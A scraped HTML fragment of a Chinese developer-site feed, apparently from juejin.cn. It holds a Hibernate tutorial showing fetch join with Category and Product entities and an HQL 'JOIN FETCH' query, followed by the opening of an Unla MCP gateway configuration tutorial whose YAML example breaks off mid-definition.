.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，<code>fetch join</code>是一种通过单个查询同时加载相关实体的方法。这种方式可避免N+1查询问题，提高数据访问效率。<code>fetch join</code>通常用于解决延迟加载带来的性能问题。</p>
<h3 data-id="heading-0">Fetch Join示例</h3>
<p>假设我们有两个实体类：<code>Category</code>和<code>Product</code>，它们之间是一对多的关系。我们将演示如何使用<code>fetch join</code>在查询<code>Category</code>时，同时加载其关联的<code>Product</code>。</p>
<h4 data-id="heading-1">步骤一：定义实体类</h4>
<h5 data-id="heading-2"><code>Category</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Set&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProducts</span><span class="hljs-params">(Set&lt;Product&gt; products)</span> {
        <span class="hljs-built_in">this</span>.products = products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product)</span> {
        products.add(product);
        product.setCategory(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeProduct</span><span class="hljs-params">(Product product)</span> {
        products.remove(product);
        product.setCategory(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-3"><code>Product</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(Double price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }

    <span class="hljs-keyword">public</span> Category <span class="hljs-title function_">getCategory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> category;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCategory</span><span class="hljs-params">(Category category)</span> {
        <span class="hljs-built_in">this</span>.category = category;
    }
}
</code></pre>
<h4 data-id="heading-4">步骤二：配置Hibernate</h4>
<p>我们需要一个配置文件来配置Hibernate连接和映射。</p>
<h5 data-id="heading-5">Hibernate配置文件 <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">步骤三：实用类HibernateUtil</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-7">步骤四：使用Fetch Join查询</h4>
<p>我们可以编写一个方法来演示如何使用<code>fetch join</code>来查询数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.query.Query;
<span class="hljs-keyword">import</span> com.example.domain.Category;
<span class="hljs-keyword">import</span> com.example.domain.Product;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateFetchJoinExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 使用Fetch Join查询数据</span>
        fetchJoinExample(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            session.getTransaction().commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            session.getTransaction().rollback();
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fetchJoinExample</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT c FROM Category c JOIN FETCH c.products WHERE c.id = :categoryId"</span>;
            Query&lt;Category&gt; query = session.createQuery(hql);
            query.setParameter(<span class="hljs-string">"categoryId"</span>, <span class="hljs-number">1L</span>);

            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> query.uniqueResult();

            System.out.println(<span class="hljs-string">"Category: "</span> + category.getName());
            <span class="hljs-keyword">for</span> (Product product : category.getProducts()) {
                System.out.println(<span class="hljs-string">"Product: "</span> + product.getName() + <span class="hljs-string">" - $"</span> + product.getPrice());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">详细解释</h3>
<ol>
<li>
<p><strong>定义实体类</strong>：</p>
<ul>
<li><code>Category</code>类与<code>Product</code>类是一对多关系，<code>Category</code>可以有多个<code>Product</code>。</li>
<li>在<code>Category</code>类中，<code>@OneToMany</code>注解用于定义与<code>Product</code>的关联关系，并且通过<code>fetch = FetchType.LAZY</code>指定延迟加载。</li>
</ul>
</li>
<li>
<p><strong>配置文件</strong>：</p>
<ul>
<li><code>hibernate.cfg.xml</code>配置文件用于设置数据库连接、Hibernate属性和映射类。</li>
</ul>
</li>
<li>
<p><strong>实用类HibernateUtil</strong>：</p>
<ul>
<li><code>HibernateUtil</code>类提供了获取<code>SessionFactory</code>实例的方法。</li>
</ul>
</li>
<li>
<p><strong>使用Fetch Join查询</strong>：</p>
<ul>
<li>在<code>insertSampleData</code>方法中，创建并保存一个<code>Category</code>和两个关联的<code>Product</code>。</li>
<li>在<code>fetchJoinExample</code>方法中，使用HQL中的<code>JOIN FETCH</code>关键字进行查询。<code>JOIN FETCH</code>可以同时加载<code>Category</code>及其关联的<code>Product</code>，从而避免了N+1查询问题。</li>
<li><code>query.uniqueResult()</code>返回一个唯一的<code>Category</code>结果，并且由于使用了<code>fetch join</code>，相关联的<code>Product</code>集合已经被初始化和加载。</li>
</ul>
</li>
</ol>
<p>通过这种方式，可以有效地利用<code>fetch join</code>来优化关联实体的加载过程，提高数据库访问的性能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Unla MCP 网关代理配置教程]]></title>    <link>https://juejin.cn/post/7594919272686567450</link>    <guid>https://juejin.cn/post/7594919272686567450</guid>    <pubDate>2026-01-14T03:57:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594919272686567450" data-draft-id="7594854295746297892" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Unla MCP 网关代理配置教程"/> <meta itemprop="keywords" content="MCP"/> <meta itemprop="datePublished" content="2026-01-14T03:57:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ALLINAI"/> <meta itemprop="url" content="https://juejin.cn/user/4001878056639549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Unla MCP 网关代理配置教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4001878056639549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ALLINAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T03:57:40.000Z" title="Wed Jan 14 2026 03:57:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Unla</strong> 是一个轻量级的 MCP 网关服务，它的核心优势在于“零代码侵入”。通过配置，可以将传统的 HTTP API 转换为标准 MCP 协议，或对现有的 MCP Server 进行反向代理。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.unla.amoylab.com%2Fcn%2Fconfiguration%2Fgateways" target="_blank" title="https://docs.unla.amoylab.com/cn/configuration/gateways" ref="nofollow noopener noreferrer">Unla MCP 网关配置官方文档</a></p>
<h4 data-id="heading-0">一、 准备工作</h4>
<ol>
<li><strong>部署 Unla</strong>：通过 Docker 或源码启动了 Unla。</li>
<li><strong>管理后台</strong>：访问 Unla 的 Web UI（默认地址通常为 <code>http://localhost:5234</code>）。</li>
</ol>
<h4 data-id="heading-1">二、 配置网关代理 (Gateways)</h4>
<p>在 Unla 中，网关配置通常分为两种场景：<strong>代理现有 MCP Server</strong> 和 <strong>转换 HTTP API</strong>。</p>
<h5 data-id="heading-2">1. 代理现有的 MCP Server</h5>
<p>如果你已经有一个运行中的 MCP Server（例如 Python/Node.js 编写的），可以通过 Unla 进行中转。</p>
<ul>
<li><strong>步骤</strong>：
<ol>
<li>登录 Web UI，点击 <strong>"网关配置"</strong> &gt; <strong>"创建"</strong> &gt; <strong>"MCP服务"</strong>。</li>
<li>选择 <strong>"YAML模式"</strong> 或者 <strong>"表单模式"</strong> 填写配置信息。</li>
<li>点击 <strong>"创建"</strong> 按钮。</li>
</ol>
</li>
</ul>
<h5 data-id="heading-3">2. 将 HTTP API 转换为 MCP 工具</h5>
<ul>
<li><strong>步骤</strong>：
<ol>
<li>登录 Web UI，点击 <strong>"网关配置"</strong> &gt; <strong>"创建"</strong> &gt; <strong>"HTTP服务"</strong>。</li>
<li>选择 <strong>"YAML模式"</strong> 或者 <strong>"表单模式"</strong> 填写配置信息。</li>
<li>点击 <strong>"创建"</strong> 按钮。</li>
</ol>
</li>
</ul>
<p>这是 Unla 最强大的功能，只需编写 YAML 即可将普通的HTTP接口变成 AI 代理工具。</p>
<ul>
<li><strong>YAML配置示例</strong>：</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">"mock-server"</span>              <span class="hljs-comment"># 代理服务名称，全局唯一</span>
<span class="hljs-attr">tenant:</span> <span class="hljs-string">"default"</span>                <span class="hljs-comment"># 租户标识，用于多租户场景</span>

<span class="hljs-comment"># 路由配置</span>
<span class="hljs-attr">routers:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">server:</span> <span class="hljs-string">"mock-server"</span>       <span class="hljs-comment"># 服务名称</span>
    <span class="hljs-attr">prefix:</span> <span class="hljs-string">"/gateway/user"</span>     <span class="hljs-comment"># 路由前缀，全局唯一，不可重复（必须以租户ID开头）</span>

    <span class="hljs-comment"># CORS 配置</span>
    <span class="hljs-attr">cors:</span>
      <span class="hljs-attr">allowOrigins:</span>             <span class="hljs-comment"># 开发测试环境可全部开放，线上最好按需开放。（大部分MCP Client是不需要开放跨域的）</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"*"</span>
      <span class="hljs-attr">allowMethods:</span>             <span class="hljs-comment"># 允许的请求方法，按需开放，对于MCP（SSE和Streamable）来说通常只需要这3个方法即可</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"GET"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"POST"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"PUT"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"OPTIONS"</span>
      <span class="hljs-attr">allowHeaders:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Content-Type"</span>        <span class="hljs-comment"># 必须允许的</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Authorization"</span>       <span class="hljs-comment"># 有鉴权需求的需要支持请求里携带此Key</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Mcp-Session-Id"</span>      <span class="hljs-comment"># 对于MCP来说，必须支持请求里携带这个Key，否则Streamable HTTP无法正常使用</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"mcp-protocol-version"</span> <span class="hljs-comment"># MCP协议版本头，用于协议版本协商</span>
      <span class="hljs-attr">exposeHeaders:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Mcp-Session-Id"</span>      <span class="hljs-comment"># 对于MCP来说，开启跨域的时候必须要暴露这个Key，否则Streamable HTTP无法正常使用</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"mcp-protocol-version"</span> <span class="hljs-comment"># MCP协议版本头</span>
      <span class="hljs-attr">allowCredentials:</span> <span class="hljs-literal">true</span>    <span class="hljs-comment"># 是否增加 Access-Control-Allow-Credentials: true 这个Header</span>

<span class="hljs-comment"># 服务配置</span>
<span class="hljs-attr">servers:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"mock-server"</span>               <span class="hljs-comment"># 服务名称，需要与routers中的server保持一致</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Mock User Service"</span>  <span class="hljs-comment"># 服务描述</span>
    <span class="hljs-attr">allowedTools:</span>                     <span class="hljs-comment"># 允许使用的工具列表（为tools的子集）</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"register_user"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"get_user_by_email"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"update_user_preferences"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"update_user_avatar"</span>
    <span class="hljs-attr">config:</span>                                           <span class="hljs-comment"># 服务级别的配置，可以在tools中通过{{.Config}}引用</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-number">123</span>                                     <span class="hljs-comment"># 写死的配置</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">'Bearer <span class="hljs-template-variable">{{ env "AUTH_TOKEN" }}</span>'</span>  <span class="hljs-comment"># 从环境变量中获取的配置，用法是'{{ env "ENV_VAR_NAME" }}'</span>

<span class="hljs-comment"># 工具配置</span>
<span class="hljs-attr">tools:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"register_user"</span>                                   <span class="hljs-comment"># 工具名称</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Register a new user"</span>                      <span class="hljs-comment"># 工具描述</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"POST"</span>                                          <span class="hljs-comment"># 请求目标（上游、后端）服务的HTTP方法</span>
